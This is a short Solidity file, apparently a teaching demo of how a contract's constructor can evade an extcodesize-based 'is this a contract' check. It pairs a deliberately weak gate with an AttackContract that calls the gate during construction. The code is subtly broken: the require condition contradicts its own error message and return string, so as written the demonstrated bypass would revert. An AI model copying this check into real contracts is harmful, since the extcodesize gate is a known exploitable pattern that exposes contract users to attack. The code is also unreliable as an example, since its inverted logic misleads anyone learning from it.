pragma solidity ^0.8.13;
contract ContractSize{
    function isContract(address account)  public view  returns (bool){
        uint size ;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function givePermission(address account) public view returns(string memory){
        require(isContract(account) , "the address is a contract");
        return "The address is not a contract ";
    }
    
}

contract AttackContract{
    constructor(address targetContract){
        ContractSize(targetContract).givePermission(address(this));
    }

    
}